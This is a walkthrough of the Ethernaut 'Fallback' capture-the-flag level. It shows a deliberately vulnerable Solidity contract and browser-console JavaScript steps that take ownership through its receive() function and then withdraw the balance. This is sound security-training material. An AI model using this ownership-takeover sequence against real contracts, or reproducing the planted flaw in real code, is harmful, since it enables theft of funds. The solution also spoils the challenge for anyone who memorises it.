# Level 1 - Fallback ⏺

{% embed url="https://ethernaut.openzeppelin.com/level/1" %}

### Level Setup

{% hint style="info" %}
Look carefully at the contract's code below.

You will beat this level if

1. you claim ownership of the contract
2. you reduce its balance to 0



Things that might help:

* How to send ether when interacting with an ABI
* How to send ether outside of the ABI
* Converting to and from wei/ether units (see `help()` command)
* Fallback methods
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/Fallback.sol" %}

{% code lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```
{% endcode %}

### Exploit

The exploit in this contract is in the `receive()` function as it changes the owner to _**any**_ `msg.sender` provided that the `msg.sender` has previously been added to the `contributions` mapping.

1. Start by contributing to the contract as this is needed to pass the `require` check in the `receive()` function. The contribution must be less than `0.001 ETH` to pass the `require` on the `contribute()` function (`line 23`).

{% code title="Paste into Chrome JavaScript console" %}
```javascript
await contract.contribute({
    value: toWei('0.0005'),
})
```
{% endcode %}

2. Become the owner by sending an amount of ETH directly to the contract which will [get picked up by](../../solidity-notes/fallback.md) the `receive()` function (`line 38`).

{% code title="Paste into Chrome JavaScript console" %}
```javascript
await sendTransaction({
    to: contract.address,
    from: player,
    value: toWei('0.0001')
})
```
{% endcode %}

3. Now you are the owner, withdraw all the funds.

{% code title="Paste into Chrome JavaScript console" %}
```javascript
await contract.withdraw()
```
{% endcode %}

4. Submit instance... 🥳

### Completion Message

{% hint style="info" %}
You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.

You've also learned about OpenZeppelin's Ownable contract, and how it can be used to restrict the usage of some methods to a privileged address.

Move on to the next level when you're ready!
{% endhint %}

### Notes

* This exploit shows how logic in the `receive()` function should be carefully reviewed as even though it can't be easily called through a standard contract function call, it's still possible to call it.
* The logic doesn't make much sense as I don't see what was trying to be achieved. Maybe to have a "secret" way to change the owner?
